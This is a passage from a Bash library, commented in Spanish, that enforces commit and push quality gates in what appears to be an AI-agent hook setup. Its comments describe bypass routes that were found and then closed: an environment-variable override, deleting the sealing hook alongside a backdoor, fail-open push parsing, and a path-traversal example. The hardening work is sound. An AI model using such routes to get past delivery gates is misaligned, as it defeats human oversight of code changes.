    if [[ "${DOD_GENERADOS_OK:-0}" != "1" ]] && dod_toca_generados "$files"; then
        return 1
    fi
    dod_is_meta_only "$files"
}

# 0 (true) si la lista toca alguno de los arboles generados.
dod_toca_generados() {
    local files="$1"
    [[ -n "$files" ]] || return 1
    printf '%s\n' "$files" | grep -qE "$DOD_GENERADOS_RE"
}

# Archivos productivos modificados o nuevos respecto de HEAD.
# `core.quotePath` (default: on) hace que git cite y escape cualquier path no
# ASCII: `srv/articulo.js` sale como `"srv/art\303\255culo.js"`. Con las comillas,
# el path deja de matchear `\.js$` y el archivo se vuelve INVISIBLE para el gate:
# entregaba sin gates 2 y 3. En un stack en espanol eso no es hipotetico.
# `-c core.quotePath=false` lo apaga por invocacion, sin tocar la config del dev.
dod_changed_files() {
    local paths
    # Si el descubrimiento falla, se propaga: quien llama no puede concluir
    # "no hay archivos productivos" a partir de un error de git.
    paths=$(dod_git_paths) || return 1
    printf '%s\n' "$paths" | dod_filtrar_productivos
}

# Archivos productivos que van en el commit (staged). Usado por el gate de entrega:
# lo que importa al commitear es lo que se commitea, no todo el working tree.
dod_staged_files() {
    git -c core.quotePath=false diff --cached --name-only 2>/dev/null | dod_filtrar_productivos
}

# 0 (true) si TODOS los archivos son del meta-stack: cambios al propio stack SAP,
# no a un entregable de cliente. Para estos, la DoD exige solo Gate 1.
# NOTA sobre `.husky/`: NO esta en la allowlist de abajo a proposito, asi que un
# cambio ahi exige los 3 gates, mientras que `hooks/scripts/` se conforma con el
# Gate 1. La asimetria es deliberada: `.husky/` decide si los hooks corren, o
# sea, si los gates existen. Es la unica pieza que no deberia poder debilitarse
# a si misma bajo un gate mas liviano.
#
# `hooks/scripts/` tiene una propiedad parecida y hoy SI es meta-only. Endurecer
# eso cambiaria el nivel de exigencia de casi todos los commits del stack, asi
# que queda como decision abierta del dueno del repo, no de un fix puntual.
#
# PORTABILIDAD MULTI-HOST (ADR-012). Entra UNA sola entrada nueva, y con nombre
# propio: `schemas/ses-*.schema.json`.
#
# El patron tiene que ser especifico porque ESTE ARCHIVO SE ENVIA AL CLIENTE
# dentro del plugin. Un `schemas/` a secas convertia en meta-only al `schemas/`
# de cualquier proyecto CAP u OData que instale el stack — contratos de API,
# fixtures con logica — y esos archivos habrian entregado sin gates 2 y 3 en el
# repo del cliente. Una allowlist que viaja necesita nombres que no colisionen.
# Por lo mismo NO se agregan `emitters/` ni `fixtures/`: todavia no existen, y
# cuando existan van namespaceados.
#
# Quedan FUERA a proposito, junto a `.husky/`:
#
#   bin/ lib/    motor de gates (`ses gates`, `ses guard`). ADR-013 lo vuelve el
#                mecanismo primario de la DoD en los 4 hosts.
#   emitters/    traduciran la DoD al bundle de cada host. Un emisor que omite
#                un hook por bug hace que ese gate no exista en ese host — mismo
#                efecto que desactivarlo, y no lo atrapa ningun linter.
#   stack.manifest.json
#                driver operativo de los 4 bundles. `validate-manifest.js` atrapa
#                rutas rotas y contradicciones, pero no atrapa intencion: un
#                `capabilities: ["exec"]` agregado a un agente que no deberia
#                tener shell valida perfecto. Eso lo ve un review, no un schema.
#
# HONESTIDAD SOBRE EL ALCANCE DE ESTE CRITERIO: `hooks/*` y `plugins/*` ya estan
# en la allowlist, y ahi vive el motor de gates actual — incluida la copia que se
# publica. O sea que el criterio "la pieza que decide si los gates existen no
# puede debilitarse a si misma" hoy se aplica a lo nuevo, no a lo que ya estaba.
# Cerrar esa brecha cambia el nivel de exigencia de casi todos los commits del
# stack y es decision del dueno del repo, no de este cambio.
dod_is_meta_only() {
    local files="$1"
    [[ -z "$files" ]] && return 0
    # Iterar por linea, no por palabra: un path con espacios se partiria en dos
    # y un archivo productivo podria clasificarse como meta-stack, saltandose
    # los gates 2 y 3.
    local f
    while IFS= read -r f; do
        [[ -z "$f" ]] && continue
        # `schemas/../srv/evil.js` empieza con un prefijo permitido y termina en
        # otro lado. Git normaliza sus paths, asi que no es explotable desde los
        # llamadores reales, pero la clasificacion no debe depender de eso.
        case "$f" in */../*|../*|*/..) return 1 ;; *) ;; esac  # El resto sigue.
        # Los schemas del stack se chequean con `[[ =~ ]]`, no con `case`: en un
        # patron de `case` el `*` CRUZA las barras, asi que
        # `schemas/ses-*.schema.json` tambien matchea
        # `schemas/ses-account/PurchaseOrder.schema.json` — justo el archivo de
        # cliente que el patron pretendia excluir. `[^/]+` ancla a un segmento.
        # Los demas patrones de abajo SI quieren ser recursivos.
        [[ "$f" =~ ^schemas/ses-[^/]+\.schema\.json$ ]] && continue
        case "$f" in
            # `plugins/sap-enterprise-stack/*` y NO `plugins/*`.
            #
            # Acotar `DOD_GENERADOS_RE` a las raices que `--check` compara saco 22
            # archivos de la exencion por salida generada — y cayeron aca, en la
            # de meta-stack, que no tiene ninguna verificacion detras.
            # `plugins/skill-creator/**` (vendoreado, 10 `.py` ejecutables) y
            # `plugins/.claude-plugin/marketplace.json` (el archivo que dirige al
            # instalador) quedaban EXENTOS siempre, cuando antes al menos exigian
            # gates si el `--check` fallaba. Fue una regresion, no un empate:
            # medido, con el regex viejo y el flag en 0 exigian gates, y con el
            # nuevo no los exigen nunca.
            #
            # La asimetria que lo delata: `fixtures/` nunca estuvo en esta lista,
            # asi que su contenido si exige gates cuando no esta verificado. Solo
            # `plugins/` tenia la puerta abierta.
            hooks/*|scripts/*|.github/*|orchestrator/*|config/*|rules/*|shared/*|agents/*|commands/*|plugins/sap-enterprise-stack/*|evals/*|tests/*|settings.json|CLAUDE.md) ;;
            *) return 1 ;;
        esac
    done <<< "$files"
    return 0
}

# Arbol que se va a entregar, segun el tipo de entrega.
#
#   commit -> el arbol del INDICE: es exactamente lo que se va a commitear.
#   push / PR -> el arbol de HEAD: ahi lo que se entrega son commits ya hechos,
#                y el indice ya no es lo relevante.
#
# `git write-tree` escribe objetos de arbol sueltos como efecto colateral. Son
# inofensivos y los recoge el `gc`; se menciona para que no sorprenda.
dod_delivery_tree() {
    if [[ "${1:-commit}" = "commit-a" ]]; then
        # `git commit -a` entrega el INDICE **mas** lo modificado en el working
        # tree. `git write-tree` solo ve el indice, asi que con `-a` devolvia un
        # arbol que NO es el que se entrega — y si el indice estaba limpio,
        # devolvia el de HEAD. Eso alcanzaba para que la verificacion confirmara
        # sobre un arbol sano mientras el commit publicaba otra cosa: exactamente
        # "la pregunta sobre un objeto, la respuesta sobre otro", por tercera vez.
        #
        # Se arma sobre un indice TEMPORAL: tocar el real desde un hook cambiaria
        # lo que el dev esta por commitear.
        local idx
        idx=$(mktemp 2>/dev/null) || return 1
        # Si no se puede armar el arbol `-a`, NO se cae al del indice: ese es
        # justo el arbol equivocado —limpio cuando la modificacion esta sin
        # stagear— y devolverlo haria que la verificacion confirme sobre algo
        # sano mientras el commit publica otra cosa. Se devuelve vacio, que el
        # llamador trata como "no se pudo verificar".
        # `git-dir` se resuelve ANTES y se exige no vacio. Sin eso, fuera de un repo
        # la ruta quedaba `/index`, el `cp` fallaba y la cadena cortaba: fallaba
        # cerrado de casualidad, no por diseno.
        # Mismo criterio que el camino de `commit`: se parte del indice que git
        # haya puesto. `-a` y el commit parcial son sintaxis mutuamente
        # excluyentes, asi que aca no es explotable — pero dos reglas distintas
        # para la misma pregunta es justo lo que este archivo persigue.
        local _gd; _gd=$(git rev-parse --git-dir 2>/dev/null)
        if [[ -z "$_gd" ]]; then
            echo "[dod] no se pudo ubicar el git-dir: no hay arbol de entrega 'commit-a'." >&2
            rm -f "$idx"; return 1
        fi
        if ! cp "${GIT_INDEX_FILE:-${_gd}/index}" "$idx" 2>/dev/null; then
            echo "[dod] no se pudo copiar el indice a un temporal: no hay arbol 'commit-a'." >&2
            rm -f "$idx"; return 1
        fi
        # EL MTIME DE LA COPIA SE ENVEJECE, y no es cosmetico.
        #
        # git decide si un archivo cambio mirando el stat cache, no el contenido.
        # Se protege de los cambios del mismo segundo con la regla "racily clean":
        # si el mtime de la entrada es >= el del ARCHIVO DE INDICE, git desconfia
        # y compara contenido. Copiar el indice a un temporal le pone mtime de
        # AHORA —medido: 20 minutos mas nuevo que el real— y con eso desactiva esa
        # proteccion para todas las entradas. O sea que la copia, que existe para
        # no tocar el indice del dev, volvia el resultado dependiente de la
        # resolucion de timestamps del filesystem: donde no hay nanosegundos, una
        # modificacion que conserva el tamano queda INVISIBLE y el arbol `-a`
        # colapsa al del indice.
        #
        # Poner el mtime en 1970 hace que TODAS las entradas sean racily clean, o
        # sea que git compare contenido siempre. Deja de depender del reloj.
        # Medido en este repo (1266 archivos): 45 ms -> 96 ms. Con el worktree
        # limpio da el mismo arbol.
        if ! touch -t 197001020000 "$idx" 2>/dev/null; then
            # Sin el envejecido, la premisa de arriba —"todas las entradas
            # racily clean"— es falsa y el arbol vuelve a depender del reloj. Un
            # arreglo que se degrada en silencio al bug que venia a cerrar es
            # peor que no tenerlo: se devuelve vacio, que el llamador ya trata
            # como "no se pudo verificar".
            echo "[dod] no se pudo envejecer el indice temporal: el arbol 'commit-a' dependeria del reloj." >&2
            rm -f "$idx"; return 1
        fi
        if ! GIT_INDEX_FILE="$idx" git add -u 2>/dev/null; then
            echo "[dod] 'git add -u' fallo sobre el indice temporal: no hay arbol 'commit-a'." >&2
            rm -f "$idx"; return 1
        fi
        GIT_INDEX_FILE="$idx" git write-tree 2>/dev/null
        rm -f "$idx"
    elif [[ "${1:-commit}" = "commit" ]]; then
        # Sobre una COPIA del indice, no sobre el indice real.
        #
        # `git write-tree` a secas toma el `index.lock`, y dos gates en paralelo
        # se lo pelean: uno devuelve vacio y el otro deniega una entrega
        # perfectamente limpia con "no se pudo determinar que arbol estas
        # entregando... revisa el estado del repo", que manda al dev a buscar
        # donde no hay nada. Medido: 5 de 10 con dos en paralelo, 10 de 15 con
        # tres. Es la clase "entregas legitimas bloqueadas" que titula la rama.
        #
        # El camino de `commit-a` ya trabajaba sobre copia y nunca fallo; esto lo
        # alinea. Leer el indice no necesita el lock.
        # SE COPIA DEL `GIT_INDEX_FILE` QUE GIT HAYA PUESTO, no siempre del real.
        #
        # git exporta `GIT_INDEX_FILE=<gitdir>/next-index-<pid>.lock` a los hooks
        # cuando el commit es PARCIAL (`git commit <ruta>`, `--only`, `-i`): ese
        # temporal contiene el subconjunto que se va a entregar. La version con
        # `git write-tree` a secas lo honraba; al pasar a copiar, esta funcion
        # empezo a leer siempre el indice completo y devolvia OTRO arbol.
        #
        # Lo que eso rompia: con el indice completo sellado, `check_flag` daba
        # MISSING=0, `mandatory-review.sh` salia antes de llegar a su deteccion de
        # commit parcial —codigo vivo, agregado justamente para sacar al dev de un
        # bucle— y el trailer y `gate-deliveries.log` quedaban registrando un
        # arbol distinto del commiteado. Un registro de auditoria que miente es
        # peor que no tenerlo.
        #
        # Fuera de un hook de git (`/sap-gates`, el PreToolUse, CI) la variable no
        # viene y se cae al indice real, asi que la copia sigue resolviendo la
        # contencion del `index.lock` que motivo el cambio — medida y real: seis
        # `git write-tree` en paralelo, varios fallan con "Unable to create
        # .git/index.lock".
        local _idx _gd _origen
        _gd=$(git rev-parse --git-dir 2>/dev/null) || return 1
        [[ -n "$_gd" ]] || return 1
        _origen="${GIT_INDEX_FILE:-${_gd}/index}"
        _idx=$(mktemp 2>/dev/null) || return 1
        if cp "$_origen" "$_idx" 2>/dev/null; then
            GIT_INDEX_FILE="$_idx" git write-tree 2>/dev/null
        fi
        rm -f "$_idx"
    else
        # `--verify` es lo que hace que un repo sin commits devuelva vacio en vez
        # de la cadena literal "HEAD^{tree}", que producia el mensaje equivocado
        # ("el codigo cambio despues") cuando en realidad no hay HEAD.
        git rev-parse --verify --quiet "HEAD^{tree}" 2>/dev/null
    fi
}

# Registro de entregas efectivamente gateadas.
#
# Existe por dos razones que resultaron ser la misma. La primera: `git push` no
# tenia forma de saber si los commits que publica pasaron los gates, asi que
# terminaba sin control (el atajo de "nada cambio" lo dejaba pasar con el arbol
# limpio). La segunda: cuando un flag desaparecia, la ausencia era
# indistinguible de "nunca se sello", y eso costo cinco rondas de diagnostico.
#
# Un registro de lo que SI paso resuelve las dos: el push verifica contra el, y
# cualquiera puede ver que se aprobo y cuando.
#
# Vive en logs/, que esta gitignored: es un ATAJO LOCAL, no el registro de
# auditoria. No viaja entre clones, y eso esta bien — en un clon nuevo no hay
# registro, el atajo no aplica y el push cae al control normal de sellos. Falla
# cerrado, que es la direccion correcta.
DOD_DELIVERY_LOG="${DOD_DELIVERY_LOG:-logs/gate-deliveries.log}"

dod_delivery_log_path() {
    printf '%s/%s' "${CLAUDE_PROJECT_DIR:-.}" "$DOD_DELIVERY_LOG"
}

# Cuantas lineas se barren buscando la base del registro. Acotado a proposito:
# tras un rebase que reescribe shas, TODAS las lineas quedan muertas y el barrido
# spawnea un `git cat-file` por cada una. Medido sin techo: 20.000 lineas = 83
# segundos en cada push, y un hook `PreToolUse` que tarda eso se lee como un
# cuelgue. Si en las primeras N no hay ninguna viva, no hay base utilizable y el
# push cae al control normal de sellos — falla cerrado.
DOD_REGISTRO_SCAN_MAX="${DOD_REGISTRO_SCAN_MAX:-200}"
DOD_REGISTRO_MAX_LINEAS="${DOD_REGISTRO_MAX_LINEAS:-2000}"

# Anota que un commit se entrego con los gates satisfechos.
dod_log_delivery() {
    local sha="$1" tree="$2" archivo lineas
    archivo=$(dod_delivery_log_path)
    mkdir -p "$(dirname "$archivo")" 2>/dev/null
    # Rotacion ANTES de escribir. Al reves, la entrega recien anotada se iba con
    # el archivo rotado y el registro activo quedaba vacio: el commit que acababa
    # de pasar los gates no figuraba en ningun lado.
    #
    # El registro crece una linea por commit gateado, para siempre, y el costo
    # del peor caso crece con el. Mismo patron que dod_log_hotfix.
    # El `2>/dev/null` de `wc` no cubre el fallo del REDIRECT del shell, que
    # ocurre antes: sin este guard, la primera corrida escupe "No such file or
    # directory" a stderr.
    lineas=0
    [[ -f "$archivo" ]] && lineas=$(wc -l < "$archivo" 2>/dev/null | tr -d ' ')
    if [[ "${lineas:-0}" -ge "$DOD_REGISTRO_MAX_LINEAS" ]]; then
        [[ -f "${archivo}.1" ]] && mv "${archivo}.1" "${archivo}.2" 2>/dev/null
        mv "$archivo" "${archivo}.1" 2>/dev/null
        # Rotar mueve la frontera hacia adelante: lo rotado pasa a contar como
        # historia anterior a la adopcion. Es la degradacion aceptable — la
        # alternativa es un barrido sin techo en cada push.
    fi
    printf '%s %s %s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$sha" "$tree" >> "$archivo" 2>/dev/null
}

DOD_TRAILER_LOG="${DOD_TRAILER_LOG:-logs/trailer-no-corroborado.log}"

# Anota que un commit quedo cubierto SOLO por su trailer, sin respaldo local.
#
# POR QUE. El trailer es evidencia no autenticada: cualquiera que escriba el
# mensaje del commit puede afirmar que los gates corrieron (ADR-013, "Que NO
# garantiza el trailer"). No lo impedimos —la alternativa criptografica no
# resiste el analisis, porque la clave viviria en la misma maquina— pero si deja
# de ser invisible. Es la misma decision que se tomo para `SES_GATES=off`, que la
# auditoria A12 obligo a loguear por ser la via de bypass documentada.
#
# Cuando el commit TAMBIEN figura en el registro local de entregas, no se anota:
# ahi los gates corrieron en esta maquina y hay respaldo independiente.
dod_log_trailer_no_corroborado() {
    local sha="$1" archivo lineas
    archivo="${CLAUDE_PROJECT_DIR:-.}/${DOD_TRAILER_LOG}"
    mkdir -p "$(dirname "$archivo")" 2>/dev/null
    # El guard del redirect: `2>/dev/null` del printf NO cubre el fallo del
    # redirect del shell, que ocurre antes y escupe un `Permission denied` crudo.
    # `dod_log_delivery` ya tenia este guard; este lo necesitaba igual.
    if ! : >> "$archivo" 2>/dev/null; then
        echo "[dod] no se pudo abrir ${archivo}: la exencion por trailer de ${sha:0:12} no quedo auditada." >&2
        return 1
    fi
    lineas=0
    [[ -f "$archivo" ]] && lineas=$(wc -l < "$archivo" 2>/dev/null | tr -d ' ')
    if [[ "${lineas:-0}" -ge "${DOD_REGISTRO_MAX_LINEAS}" ]]; then
        [[ -f "${archivo}.1" ]] && mv "${archivo}.1" "${archivo}.2" 2>/dev/null
        mv "$archivo" "${archivo}.1" 2>/dev/null
    fi
    # Si no se puede escribir, se AVISA. Un registro de auditoria que desaparece
    # en silencio es peor que no tenerlo: deja creyendo que hay rastro. Es el
    # mismo criterio que `dod_log_gates_off`, que propaga el error.
    if ! printf '%s %s trailer-no-corroborado %s\n' \
        "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$sha" \
        "$(git log -1 --format=%s "$sha" 2>/dev/null | tr -d '\n')" >> "$archivo" 2>/dev/null
    then
        echo "[dod] no se pudo registrar la exencion por trailer de ${sha:0:12} en ${archivo}." >&2
        echo "[dod] el push sigue, pero ESA exencion no quedo auditada." >&2
        return 1
    fi
}

# 0 (true) si ese commit figura como entregado con gates.
dod_delivery_logged() {
    local sha="$1" archivo
    archivo=$(dod_delivery_log_path)
    [[ -f "$archivo" ]] || return 1
    grep -qF " $sha " "$archivo" 2>/dev/null
}

# Commits que un push publicaria: los que no estan en ningun remoto.
DOD_PUSH_SCAN_MAX="${DOD_PUSH_SCAN_MAX:-50}"
# Techo AGREGADO de la verificacion de salida generada en push. Es un
# `PreToolUse`: pasado este punto, bloquear con un motivo claro es mejor que
# seguir corriendo sin que el dev sepa que esta pasando.
DOD_GEN_PRESUPUESTO_SEG="${DOD_GEN_PRESUPUESTO_SEG:-45}"

# El RANGO que un push publica, para pasarselo a `git`.
#
# SIN REMOTOS SE CLASIFICA IGUAL. Hubo una version que devolvia vacio cuando no
# habia remotos configurados, razonando que "si no hay remoto, `git push` falla
# solo". Es FALSO: `git push <URL> <refspec>` publica sin ningun remoto
# configurado, y ese atajo lo dejaba pasar sin gates — tambien `gh pr create`.
# Cuatro tests de `__smoketest__/delivery-gate-test.sh` ya cubrian esto y se
# pusieron en rojo; el atajo duro lo que tardo alguien en correr esa suite.
#
# Tampoco hacia falta. El problema que intentaba resolver —el primer push de un
# repo con mucha historia salia denegado— lo cierra `dod-classify.sh --union`,
# que clasifica el rango ENTERO de una sola pasada y sin ventana. Con o sin
# remotos, si todo lo que publica es documentacion, queda exento por contenido.
# El RANGO que un push publica.
#
# NO SE LEE EL TEXTO DEL COMANDO. La version anterior tomaba el primer token
# no-flag despues de `push`, y eso fallaba de tres maneras, todas hacia el lado
# permisivo:
#
#   - `git push -o <remoto> origin main`: el valor de la opcion matcheaba un
#     remoto configurado y se tomaba por destino. Idem `--receive-pack`.
#   - `git push a && git push b`: el `.*` era greedy y se quedaba con el ULTIMO.
#   - Un destino por URL no se reconocia y caia al criterio amplio.
#
# Y el criterio "amplio" era el error de fondo: `--not --remotes` excluye lo
# alcanzable desde CUALQUIER remoto, asi que da un rango MAS CHICO, no mas grande.
# Caer ahi ante la duda es fallar ABIERTO, que es lo contrario de lo que se queria.
#
# Se le pregunta a git:
#
#   - Con UN solo remoto no hay ambiguedad: `--not --remotes` es exacto.
#   - Con varios, se usa el upstream de la rama, que git resuelve por su cuenta.
#   - Sin upstream y con varios remotos no se puede saber a cual va: se usa `HEAD`
#     entero. Bloquea de mas, que es el lado correcto para equivocarse.
dod_rango_a_publicar() {
    local n upstream remoto
    n=$(git remote 2>/dev/null | grep -c .) || n=0
    if [[ "${n:-0}" -le 1 ]]; then
        printf 'HEAD --not --remotes'
        return 0
    fi
    upstream=$(git rev-parse --abbrev-ref --symbolic-full-name '@{upstream}' 2>/dev/null)
    if [[ -n "$upstream" ]]; then
        remoto="${upstream%%/*}"
        if git remote 2>/dev/null | grep -qxF "$remoto"; then
            printf 'HEAD --not --remotes=%s' "$remoto"
            return 0
        fi
    fi
    printf 'HEAD'
}

dod_commits_a_publicar() {
    local rango
    rango=$(dod_rango_a_publicar) || return 0
    # shellcheck disable=SC2086
    git rev-list $rango 2>/dev/null | head -"$DOD_PUSH_SCAN_MAX"
}

# ¿El push trae MAS commits de los que se inspeccionan?
#
# Aplica a los DOS recorridos por commit: el de trailers y el de salida generada
# (`_dod_generados_por_commit`). Este comentario decia que la exencion por
# contenido "ya no depende de esta ventana" — era cierto cuando la exencion se
# resolvia una sola vez sobre HEAD, y dejo de serlo cuando paso a ser por commit.
# Mientras tanto, la frase era exactamente lo que hacia que nadie volviera a
# mirar aca, que es donde estaba el bypass. La exencion la aplica
# `dod-classify.sh --union` sobre el rango entero, en una sola pasada de git.
#
# `dod_commits_a_publicar` corta a `DOD_PUSH_SCAN_MAX`. Quien decida algo sobre
# ese subconjunto tiene que saber que hay commits que no miro: `rev-list` devuelve
# del mas nuevo al mas viejo, asi que lo que queda afuera es el arranque de la
# rama — justo donde suele estar el commit productivo de una rama larga.
dod_push_excede_ventana() {
    local n rango
    rango=$(dod_rango_a_publicar) || return 1
    # shellcheck disable=SC2086
    n=$(git rev-list --count $rango 2>/dev/null) || return 1
    [[ -n "$n" ]] && (( n > DOD_PUSH_SCAN_MAX ))
}

# ¿El commit lleva un trailer `SES-Gated-Tree` que cubre SU PROPIO arbol?
#
# Es la evidencia PORTATIL de que ese contenido paso por los gates: viaja dentro
# del commit, a diferencia del registro local, que es de esta maquina y se poda.
# `bin/ses.mjs gates --ci` ya verifica exactamente esto; reconocerlo aca es lo que
# ADR-013 pide —una sola regla— y lo que hace que un squash merge no vuelva a
# pedir los gates: los commits originales conservan su trailer valido.
#
# Un `--amend` posterior al sellado cambia el arbol y el trailer deja de cubrirlo:
# ahi NO se reconoce, que es el comportamiento correcto.
dod_trailer_cubre_su_arbol() {
    local sha="$1" arbol trailer
    [[ -n "$sha" ]] || return 1
    arbol=$(git rev-parse --verify --quiet "${sha}^{tree}" 2>/dev/null) || return 1
    [[ -n "$arbol" ]] || return 1
    #
    # GANA EL ULTIMO, y no es un detalle: es lo que hace que un merge sobreviva.
    #
    # Al mergear o squashear, git CONCATENA los mensajes, y con ellos los
    # trailers. El ultimo es el del commit final de la rama, cuyo arbol es
    # exactamente el arbol del merge. Medido sobre los 8 commits multi-trailer de
    # los ultimos 100 de este repo: en 6 el ULTIMO cubre el arbol y el PRIMERO no
    # lo cubre en NINGUNO. Uno tiene 26 trailers.
    #
    # El defecto que se arreglo no era este `tail -1`: era que `bin/ses.mjs` tomaba
    # el PRIMERO (`.exec()` sin `g`). Con dos trailers este lector aceptaba el push
    # y CI lo denegaba para siempre, porque el primero es el mas viejo y nunca se
    # movia. Dos reglas donde ADR-013 promete una.
    #
    # Una version de este arreglo hizo que MAS DE UN trailer denegara, con el
    # argumento de que un commit sellado dos veces es ambiguo. Estaba mal por dos
    # motivos. Rompe el squash, que `rules/DEFINITION-OF-DONE.md` promete que
    # sobrevive. Y no compra nada: el trailer se ata al ARBOL, no a que los gates
    # hayan corrido, asi que quien edite el mensaje a mano escribe el trailer
    # correcto de una sola vez y ningun conteo lo frena.
    #
    # Lo que SI evita que se acumulen es `.husky/prepare-commit-msg`, que reemplaza
    # en vez de appendear: por el flujo normal —sellar, editar, re-sellar,
    # `--amend`— queda uno solo.
    #
    # El patron tiene que ser EL MISMO que el de `lib/trailer.mjs`. Cuando aca se
    # exigia un espacio exacto y alla se aceptaba `\s*`, un trailer con CRLF o con
    # doble espacio pasaba en CI y el gate local lo DENEGABA: una entrega legitima
    # bloqueada.
    #
    # El largo va de 40 a 64: git 2.29+ soporta repos SHA-256, donde un arbol son
    # 64 hex. Con `{40}` fijo, en esos repos NINGUN trailer matcheaba y todos los
    # commits caian a "sin gatear" sin explicacion.
    #
    # Hex en MINUSCULA y MAYUSCULA: `_dod_seal` acepta las dos al escribir el flag,
    # y aca se exigia solo minuscula. git emite minuscula, asi que no es
    # explotable, pero un valor uppercase se clasificaba como "falta el trailer" en
    # vez de "cubre otro contenido", y el mensaje mandaba a buscar donde no era.
    trailer=$(git log -1 --format=%B "$sha" 2>/dev/null | dod_trailer_de_mensaje)
    [[ -n "$trailer" && "$trailer" = "$arbol" ]]
}

# El arbol que declara un mensaje de commit, o vacio si no declara ninguno.
#
# Es una funcion y no un pipe inline por una razon concreta: el test que compara
# esta regla con la de `lib/trailer.mjs` tenia el patron COPIADO adentro, asi que
# mutar el de aca no movia el test. Dos definiciones de la regla, dentro del test
# que existe para detectar que hay dos definiciones de la regla. Medido: el
# mutante que desalineaba las mayusculas sobrevivia.
#
# `LC_ALL=C` en el grep: con locale UTF-8, el `[[:space:]]` del grep de macOS
# incluye NBSP y EM SPACE, y el de JS no. Un trailer escrito a mano con NBSP daba
# "cubre" en el gate local y "no cubre" en CI — la misma divergencia de siempre,
# esta vez dependiente del locale de la maquina. Lo midio el Gate 3.
dod_trailer_de_mensaje() {
    tr -d '\r' \
        | LC_ALL=C grep -oE '^SES-Gated-Tree:[[:space:]]*[0-9a-fA-F]{40,64}[[:space:]]*$' | tail -1 \
        | sed -E 's/^SES-Gated-Tree:[[:space:]]*//; s/[[:space:]]*$//'
}

# Primer commit registrado que existe en este repo: la frontera del mecanismo.
#
# Se usa ASCENDENCIA y no fechas. Con fechas la frontera se corre sola —el
# registro se escribe despues del commit, y con granularidad de segundos el
# propio commit registrado puede quedar del lado excluido— y el resultado es una
# ventana que a veces incluye y a veces no. La ascendencia es exacta: o el commit
# es anterior a la adopcion, o no.
dod_registro_base() {
    local archivo sha n=0
    archivo=$(dod_delivery_log_path)
    [[ -s "$archivo" ]] || return 1
    while read -r _ sha _; do
        [[ -n "$sha" ]] || continue
        n=$((n + 1))
        [[ "$n" -gt "$DOD_REGISTRO_SCAN_MAX" ]] && return 1
        if git cat-file -e "${sha}^{commit}" 2>/dev/null; then printf '%s' "$sha"; return 0; fi
    done < "$archivo"
    return 1
}

# 0 (true) si ese ARBOL figura entregado con gates.
#
# Respaldo del chequeo por sha: un `git commit --amend` que solo cambia el
# mensaje produce un sha nuevo sobre el mismo arbol, y el contenido revisado no
# cambio. Sin esto obligaba a re-correr los dos gates por editar una coma del
# mensaje.
dod_delivery_tree_logged() {
    local tree="$1" archivo
    [[ -n "$tree" ]] || return 1
    archivo=$(dod_delivery_log_path)
    [[ -f "$archivo" ]] || return 1
    # Anclado al fin de linea. Sin anclar, un token mas largo que empiece con el
    # hash tambien matchea. Hoy no es alcanzable —el escritor pone 3 campos de
    # 40 hex— pero lo seria en cuanto el log se edite a mano, se corrompa, o el
    # formato gane un campo. Cuesta lo mismo y elimina la clase entera.
    grep -qE " ${tree}\$" "$archivo" 2>/dev/null
}

# 0 (true) si el commit es anterior a la adopcion del registro: a la historia
# previa no se le pueden pedir gates retroactivos.
# El hook que estampa el trailer. El commit que lo INTRODUJO es la frontera del
# mecanismo, y es la misma que usa `bin/ses.mjs gates --ci`.
# CONSTANTE, SIN `:-`: la frontera no se mueve desde el entorno.
#
# `dod_commit_de_adopcion` devuelve el primer commit que AGREGO este path, y todo
# ancestro suyo queda exento por antiguedad. Con `:-`, apuntar la variable a un
# archivo agregado hace dos commits eximia la historia entera: medido, un
# `DOD_HOOK_TRAILER=NOTAS.md` convierte el deny de un backdoor sin sellar en
# allow, en el hook y en `.husky/pre-push`.
#
# Eso falsificaba literalmente lo que promete `rules/DEFINITION-OF-DONE.md`: "la
# frontera es el commit que introdujo el hook de sellado, que es un hecho de la
# historia y no se mueve al clonar". Se movia con un `export`. Y `bin/ses.mjs` ya
# lo tenia hardcodeado, asi que las dos implementaciones divergian — justo la
# asimetria que ADR-013 dice existir para eliminar.
#
# SIN `readonly`. Lo puse y lo saque: la lib puede cargarse dos veces en el mismo
# proceso —la nota del nonce, arriba, ya cuenta con eso— y bajo `set -e`, que es
# como la cargan los hooks, la segunda asignacion a una variable de solo-lectura
# ABORTA el script. Medido: el `source` numero dos mata al hook entero.
# La asignacion plana ya cierra el bypass, porque pisa el valor del entorno antes
# del primer uso; `readonly` solo protegia contra una reasignacion interna que
# nadie hace, a cambio de un modo de falla nuevo.
DOD_HOOK_TRAILER='.husky/prepare-commit-msg'

# El commit que introdujo el hook por primera vez, o "" si nunca existio.
dod_commit_de_adopcion() {
    git log --diff-filter=A --format=%H -- "$DOD_HOOK_TRAILER" 2>/dev/null | tail -1
}

# ¿Ese commit es anterior a que el mecanismo existiera?
#
# LA PREGUNTA CORRECTA ES POR ASCENDENCIA, NO POR SNAPSHOT. Hubo dos versiones
# equivocadas antes de esta, y las dos eximian de mas:
#
#   1. "¿es ancestro de la primera linea viva del registro local?" — `logs/` esta
#      gitignored, asi que todo clon nuevo arrancaba con registro vacio y el
#      primer sello eximia retroactivamente a todos sus ancestros.
#   2. "¿el hook falta en el arbol de ESE commit?" — entonces un commit que BORRA
#      el hook de su propio arbol se declara a si mismo prehistorico. Un commit
#      que borra el hook y mete un backdoor, mas otro que lo restaura con trailer
#      valido, publicaba cualquier cosa. En los TRES niveles de ADR-013.
#
# La adopcion es un hecho de la historia y no se mueve: es el primer commit que
# agrego el archivo. Un commit posterior que lo borre NO es ancestro de ese, asi
# que no se exime — ahora si falla CERRADO.
dod_anterior_al_mecanismo() {
    local sha="$1" adopcion
    [[ -n "$sha" ]] || return 1
    adopcion=$(dod_commit_de_adopcion)
    # Sin adopcion no hay frontera: nada queda exento por antiguedad.
    [[ -n "$adopcion" ]] || return 1
    # El propio commit de adopcion no es anterior a si mismo.
    [[ "$sha" = "$adopcion" ]] && return 1
    git merge-base --is-ancestor "$sha" "$adopcion" 2>/dev/null
}

dod_anterior_al_registro() {
    local sha="$1" base
    base=$(dod_registro_base) || return 1
    [[ "$sha" = "$base" ]] && return 1
    git merge-base --is-ancestor "$sha" "$base" 2>/dev/null
}

# 0 (true) si el flag cubre EXACTAMENTE este arbol.
#
# Es el control que reemplaza al reloj. Un approval deja de ser reutilizable para
# otro diff: si se edita una linea, el arbol cambia y el flag no cubre nada. Eso
# es mas friccion que antes — el flujo pasa a ser correr gates, no tocar nada,
# entregar — pero es la unica forma de que "revise esto" signifique lo que dice.
#
